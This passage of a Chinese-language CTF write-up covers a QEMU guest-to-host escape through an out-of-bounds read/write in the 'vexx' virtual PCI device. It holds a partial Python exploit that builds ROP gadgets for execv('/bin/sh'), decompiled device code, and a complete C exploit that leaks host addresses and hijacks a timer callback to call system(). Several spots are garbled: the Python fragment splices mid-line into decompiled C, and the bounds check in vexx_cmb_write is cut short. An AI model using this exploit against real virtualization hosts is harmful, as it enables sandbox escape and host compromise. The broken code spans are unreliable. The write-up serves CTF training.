        print("[+] dev_addr:", hex(dev_addr))
        plt_base = dev_addr - 0x2d4ec0
        system_plt = plt_base + 0x2d6be0
        binsh = plt_base + 0xa70098
        print("[+] system_plt:", hex(system_plt))
        print("[+] binsh:", hex(binsh))
        heap_addr = read_1(user_buf + 0x1000 + 0xc0)
        print("[+] heap_addr:", hex(heap_addr))
        # 0x0000000014bd1e: mov rsi, [rbx+0x10]; mov rdx, r12; mov rdi, r14; call qword ptr [rax+0x20];
        gadget1 = libc_base + 0x14bd1e
        gadget2 = plt_base + 0x3d2f05  # mov rdi, "/bin/sh"; call execv
        print("[+] gadget1:", hex(gadget1))
        print("[+] gadget2:", hex(gadget2))
        print("[+] oob to write config_read")
        writeb64(user_buf+0x1000+0x460, p64(gadget1))
        writeb64(user_buf+0x1000+0x20, p64(gadget2))
        dma_read(0, user_buf+0x1000,(1qdev.parent_obj,
             "vexx",
             "/home/giglf/workbench/learn/qemu-4.0.0/hw/misc/vexx.c",
             482,
             "pci_vexx_realize");
      pdev->config[61] = 1;
      if ( !msi_init(pdev, 0, 1u, 1, 0, errp) )
      {
        timer_init_full(
          (QEMUTimer_0 *)&v2[81].properties,
          0LL,
          QEMU_CLOCK_VIRTUAL,
          1000000,
          0,
          (QEMUTimerCB *)vexx_dma_timer,
          v2);
        qemu_mutex_init((QemuMutex_0 *)&v2[70].ref);
        qemu_cond_init((QemuCond_0 *)&v2[71].parent);
        qemu_thread_create((QemuThread_0 *)&v2[70].properties, "vexx", (void *(*)(void *))vexx_fact_thread, v2, 0);
        memory_region_init_io((MemoryRegion_0 *)&v2[56].parent, v2, &vexx_mmio_ops, v2, "vexx-mmio", 0x1000uLL);
        memory_region_init_io((MemoryRegion_0 *)&v2[62].parent, v2, &vexx_cmb_ops, v2, "vexx-cmb", 0x4000uLL);
        portio_list_init((PortioList_0 *)&v2[68].parent, v2, vexx_port_list, v2, "vexx");
        v3 = pci_address_space_io(pdev);
        portio_list_add((PortioList_0 *)&v2[68].parent, v3, 0x230u);
        pci_register_bar(pdev, 0, 0, (MemoryRegion_0 *)&v2[56].parent);
        pci_register_bar(pdev, 1, 4u, (MemoryRegion_0 *)&v2[62].parent);
      }
    }
可以看到注册了两个`mmio`内存，分别为`vexx-cmb`和`vexx-mmio`。
漏洞点在于`vexx_cmb_write`和`vexx-cmb_read`的越界读写
    void __fastcall vexx_cmb_write(VexxState *opaque, hwaddr addr, uint64_t val, unsigned int size)
    {
      uint32_t v4; // eax
      hwaddr v5; // rax
      v4 = opaque->memorymode;
      if ( (v4 & 1) != 0 )
      {
        if ( addr > 0x100 )
          return;
        LODWORD(addr) = opaque->req.offset + addr;
        goto LABEL_4;
      }
      if ( (v4 & 2) == 0 )
      {
        if ( addr > 0x100 )
          return;
        goto LABEL_4;
      }
      v5 = addr - 0x100;
      LODWORD(addr) = addr - 0x100;
      if ( v5 req.req_buf[(unsigned int)addr] = val;// write val
    }
可以看到将`val`赋值给`req.req_buf[addr]`，而`addr=opaque->req.offset +
addr`，这里的`offset`和`addr`都由我们指定，所以这里存在越界读写漏洞。
###  漏洞利用
越界读，泄漏地址。越界写，修改函数指针。
###  EXP
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    unsigned char* mmio_mem;
    uint64_t phy_userbuf;
    char *userbuf;
    unsigned char* cmb_mem;
    void Err(char* err){
        printf("Error: %s\n", err);
        exit(-1);
    }
    void init_mmio(){
        int mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
        if(mmio_fd < 0){
            Err("Open pci");
        }
        mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
        if(mmio_mem<0){
            Err("mmap mmio_mem");
        }
    }
    void init_cmb(){
        int fdcmb = open("/sys/devices/pci0000:00/0000:00:04.0/resource1", O_RDWR|O_SYNC);
        if (fdcmb < 0) {
            Err("fdcmb open");
        }
        cmb_mem = mmap(NULL, 0x4000, PROT_READ | PROT_WRITE, MAP_SHARED, fdcmb, 0);
        if (cmb_mem == MAP_FAILED) {
            Err("cmb");
        }
    }
    uint64_t mmio_read(uint64_t addr){
        return *(uint64_t*)(mmio_mem+addr);
    }
    void mmio_write(uint64_t addr, uint64_t value){
        *(uint64_t*)(mmio_mem+addr) = value;
    }
    void cmb_write(uint64_t addr, uint64_t value){
        *(uint64_t*)(cmb_mem+addr) = value;
    }
    uint64_t cmb_read(uint64_t addr){
        return *(uint64_t*)(cmb_mem+addr);
    }
    void set_offset(uint64_t val){
        outb(val, 0x240);
    }
    void set_mode(uint64_t val){
        outb(val, 0x230);
    }
    size_t va2pa(void *addr){
        uint64_t data;
        int fd = open("/proc/self/pagemap",O_RDONLY);
        if(!fd){
            perror("open pagemap");
            return 0;
        }
        size_t pagesize = getpagesize();
        size_t offset = ((uintptr_t)addr / pagesize) * sizeof(uint64_t);
        if(lseek(fd,offset,SEEK_SET) < 0){
            puts("lseek");
            close(fd);
            return 0;
        }
        if(read(fd,&data,8) != 8){
            puts("read");
            close(fd);
            return 0;
        }
        if(!(data & (((uint64_t)1 << 63)))){
            puts("page");
            close(fd);
            return 0;
        }
        size_t pageframenum = data & ((1ull << 55) - 1);
        size_t phyaddr = pageframenum * pagesize + (uintptr_t)addr % pagesize;
        close(fd);
        return phyaddr;
    }
    void dma_set_cmd(uint64_t val){
        mmio_write(0x98, val);
    }
    void dma_set_src(uint64_t src){
        mmio_write(0x80, src);
    }
    void dma_set_cnt(uint64_t cnt){
        mmio_write(0x90, cnt);
    }
    void dma_set_dst(uint64_t dst){
        mmio_write(0x88, dst);
    }
    void dma_write(uint64_t idx, uint64_t cnt){
        dma_set_src(idx);
        dma_set_cnt(cnt);
        dma_set_dst(phy_userbuf);
        dma_set_cmd(3);
        sleep(1);
    }
    int main(){
        int res = 0;
        printf("init mmio fd:\n");
        init_mmio();
        printf("init cmb:\n");
        init_cmb();
        userbuf = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
        if (userbuf == MAP_FAILED)
            Err("mmap userbuf");
        mlock(userbuf, 0x1000);
        phy_userbuf = va2pa(userbuf);
        printf("userbuf va: 0x%llx\n", userbuf);
        printf("userbuf pa: 0x%llx\n", phy_userbuf);
        res = ioperm(0x230, 0x30, 1);
        if (res < 0) {
            Err("ioperm");
        }
        printf("leak addr:\n");
        set_mode(1);
        set_offset(0xf0);
        size_t timer_addr = cmb_read(0x48);
        printf("timer_addr: 0x%lx\n", timer_addr);
        size_t system_plt = timer_addr - 0x4dcf10 + 0x2ab860;
        printf("system_plt: 0x%lx\n", system_plt);
        size_t sh_addr = timer_addr - 0x4dcf10 + 0x82871C;
        printf("sh_addr: 0x%lx\n", sh_addr);
        set_mode(1);
        set_offset(0xf0);
        size_t dev_addr = cmb_read(0x50);
        printf("dev_addr: 0x%lx\n", dev_addr);
        size_t buf_addr = dev_addr+0xce8;
        printf("buf_addr: 0x%lx\n", buf_addr);
        set_mode(1);
        set_offset(0xf0);
        size_t cmd1 = 0x20746163;
        size_t cmd2 = 0x6f6f722f;
        cmb_write(0x68, cmd1);
        size_t cmd3 = 0x6c662f74;
        size_t cmd4 = 0x00006761;
        cmb_write(0x6c, cmd2);
        cmb_write(0x70, cmd3);
        cmb_write(0x74, cmd4);
        printf("oob write:\n");
        set_mode(1);
        set_offset(0xf0);
        cmb_write(0x48, system_plt);
        cmb_write(0x50, buf_addr);
        dma_set_cmd(1);
        return 1;
    }
## 参考文献
[[QWB2021 Quals] – EzQtest](https://matshao.com/2021/06/15/QWB2021-Quals-EzQtest/#more)
[qemu-pwn-xnuca-2019-vexx](https://ray-cp.github.io/archivers/qemu-pwn-xnuca-2019-vexx)